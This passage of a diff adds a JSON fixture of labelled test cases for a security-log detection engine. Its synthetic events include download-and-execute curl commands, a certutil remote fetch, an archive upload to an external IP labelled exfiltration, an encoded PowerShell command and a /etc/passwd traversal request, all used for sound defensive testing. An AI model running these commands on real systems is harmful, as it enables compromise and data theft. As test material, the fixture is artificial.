+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 22}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 80,
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 80}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:03+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 80,
+        "line": 4,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:03+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 80}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:04+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 443,
+        "line": 5,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:04+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 443}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:05+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 443,
+        "line": 6,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:05+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 443}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:06+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 3306,
+        "line": 7,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:06+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 3306}"
+      }
+    ],
+    "expected_types": [
+      "network_scan"
+    ],
+    "note": ""
+  },
+  {
+    "name": "firewall_host_boundary",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 22,
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 22}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "a",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 80,
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"a\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 80}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "b",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 443,
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"b\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 443}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:03+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "b",
+        "country": "UNKNOWN",
+        "action": "firewall",
+        "status": "failed",
+        "event_type": "firewall_block",
+        "destination_ip": "10.0.0.2",
+        "destination_port": 3306,
+        "line": 4,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:03+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"b\", \"country\": \"UNKNOWN\", \"action\": \"firewall\", \"status\": \"failed\", \"event_type\": \"firewall_block\", \"destination_ip\": \"10.0.0.2\", \"destination_port\": 3306}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "routine_sudo_administration",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "/usr/bin/id",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"/usr/bin/id\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:11+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "/usr/bin/systemctl restart nginx",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:11+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"/usr/bin/systemctl restart nginx\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:12+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "/usr/bin/apt update",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:12+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"/usr/bin/apt update\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "privilege_group_change",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "/usr/sbin/usermod -aG sudo service-account",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"/usr/sbin/usermod -aG sudo service-account\"}"
+      }
+    ],
+    "expected_types": [
+      "privilege_escalation"
+    ],
+    "note": ""
+  },
+  {
+    "name": "routine_powershell_script",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "process",
+        "status": "alert",
+        "command": "powershell.exe -File C:/scripts/backup.ps1",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"process\", \"status\": \"alert\", \"command\": \"powershell.exe -File C:/scripts/backup.ps1\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "encoded_powershell_review",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "process",
+        "status": "success",
+        "command": "powershell.exe -EncodedCommand SQBFAFgA",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"process\", \"status\": \"success\", \"command\": \"powershell.exe -EncodedCommand SQBFAFgA\"}"
+      }
+    ],
+    "expected_types": [
+      "suspicious_powershell"
+    ],
+    "note": "Encoding is a review signal; the payload is not decoded or proven malicious."
+  },
+  {
+    "name": "routine_certificate_hash",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "process",
+        "status": "alert",
+        "command": "certutil -hashfile C:/downloads/app.exe SHA256",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"process\", \"status\": \"alert\", \"command\": \"certutil -hashfile C:/downloads/app.exe SHA256\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "certificate_tool_remote_fetch",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "process",
+        "status": "success",
+        "command": "certutil -urlcache -split -f https://example.test/tool.exe",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"process\", \"status\": \"success\", \"command\": \"certutil -urlcache -split -f https://example.test/tool.exe\"}"
+      }
+    ],
+    "expected_types": [
+      "lolbin_execution"
+    ],
+    "note": ""
+  },
+  {
+    "name": "authorized_install_after_first_login",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "curl http://example.test/a -o /tmp/a",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"curl http://example.test/a -o /tmp/a\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:11+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "chmod +x /tmp/a",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:11+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"chmod +x /tmp/a\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:12+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "/tmp/a",
+        "line": 4,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:12+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"/tmp/a\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": "First observation of a source does not establish compromised authentication."
+  },
+  {
+    "name": "compromised_auth_download_execute",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:00+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:00+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:01+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:01+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:01+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:01+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:02+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "failed",
+        "line": 3,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:02+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"failed\", \"raw\": \"{\\\"timestamp\\\": \\\"2026-09-01T10:00:02+00:00\\\", \\\"user\\\": \\\"analyst\\\", \\\"ip\\\": \\\"192.0.2.10\\\", \\\"host\\\": \\\"srv-a\\\", \\\"country\\\": \\\"UNKNOWN\\\", \\\"action\\\": \\\"login\\\", \\\"status\\\": \\\"failed\\\", \\\"raw\\\": \\\"{\\\\\\\"timestamp\\\\\\\": \\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\", \\\\\\\"user\\\\\\\": \\\\\\\"analyst\\\\\\\", \\\\\\\"ip\\\\\\\": \\\\\\\"192.0.2.10\\\\\\\", \\\\\\\"host\\\\\\\": \\\\\\\"srv-a\\\\\\\", \\\\\\\"country\\\\\\\": \\\\\\\"UNKNOWN\\\\\\\", \\\\\\\"action\\\\\\\": \\\\\\\"login\\\\\\\", \\\\\\\"status\\\\\\\": \\\\\\\"failed\\\\\\\", \\\\\\\"raw\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"timestamp\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2026-09-01T10:00:02+00:00\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"user\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"analyst\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"ip\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"192.0.2.10\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"host\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"srv-a\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"country\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UNKNOWN\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"action\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"login\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"status\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"failed\\\\\\\\\\\\\\\"}\\\\\\\"}\\\"}\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:05+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "login",
+        "status": "success",
+        "line": 4,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:05+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"login\", \"status\": \"success\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "curl http://example.test/a -o /tmp/a",
+        "line": 5,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"curl http://example.test/a -o /tmp/a\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:11+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "chmod +x /tmp/a",
+        "line": 6,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:11+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"chmod +x /tmp/a\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:12+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "/tmp/a",
+        "line": 7,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:12+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"/tmp/a\"}"
+      }
+    ],
+    "expected_types": [
+      "brute_force",
+      "account_takeover",
+      "post_auth_download_execute"
+    ],
+    "note": ""
+  },
+  {
+    "name": "ordinary_archive_backup",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "tar -czf /tmp/backup.tar.gz /var/data",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"tar -czf /tmp/backup.tar.gz /var/data\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:11+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "curl -T /tmp/backup.tar.gz https://192.0.2.50/upload",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:11+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"curl -T /tmp/backup.tar.gz https://192.0.2.50/upload\"}"
+      }
+    ],
+    "expected_types": [
+      "archive_transfer_review"
+    ],
+    "note": "Policy change: same-file external backup without explicit trusted destination now produces medium review, not confirmed exfiltration. Authorized external backups can use TRUSTED_TRANSFER_NETWORKS."
+  },
+  {
+    "name": "archive_to_configured_indicator",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "tar -czf /tmp/backup.tar.gz /var/data",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"tar -czf /tmp/backup.tar.gz /var/data\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:11+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "curl -T /tmp/backup.tar.gz https://203.0.113.77/upload",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:11+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"curl -T /tmp/backup.tar.gz https://203.0.113.77/upload\"}"
+      }
+    ],
+    "expected_types": [
+      "data_exfiltration"
+    ],
+    "note": "Possible transfer of staged data; command logs do not prove byte transfer."
+  },
+  {
+    "name": "unrelated_archive_and_transfer",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "tar -czf /tmp/backup.tar.gz /var/data",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"tar -czf /tmp/backup.tar.gz /var/data\"}"
+      },
+      {
+        "timestamp": "2026-09-01T10:00:11+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "curl -T /tmp/other.txt https://203.0.113.77/upload",
+        "line": 2,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:11+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"curl -T /tmp/other.txt https://203.0.113.77/upload\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "encoded_web_traversal",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "GET",
+        "status": "success",
+        "request": "GET /%252e%252e%252fetc/passwd HTTP/1.1",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:00+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"GET\", \"status\": \"success\", \"request\": \"GET /%252e%252e%252fetc/passwd HTTP/1.1\"}"
+      }
+    ],
+    "expected_types": [
+      "web_attack"
+    ],
+    "note": ""
+  },
+  {
+    "name": "sql_text_in_admin_command",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:10+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "UNKNOWN",
+        "action": "privilege",
+        "status": "alert",
+        "command": "echo \"UNION SELECT and ../ are examples\"",
+        "line": 1,
+        "raw": "{\"timestamp\": \"2026-09-01T10:00:10+00:00\", \"user\": \"analyst\", \"ip\": \"192.0.2.10\", \"host\": \"srv-a\", \"country\": \"UNKNOWN\", \"action\": \"privilege\", \"status\": \"alert\", \"command\": \"echo \\\"UNION SELECT and ../ are examples\\\"\"}"
+      }
+    ],
+    "expected_types": [],
+    "note": ""
+  },
+  {
+    "name": "country_change_then_failed_login",
+    "events": [
+      {
+        "timestamp": "2026-09-01T10:00:00+00:00",
+        "user": "analyst",
+        "ip": "192.0.2.10",
+        "host": "srv-a",
+        "country": "US",
+        "action": "login",
+        "status": "success",
+        "line": 1,
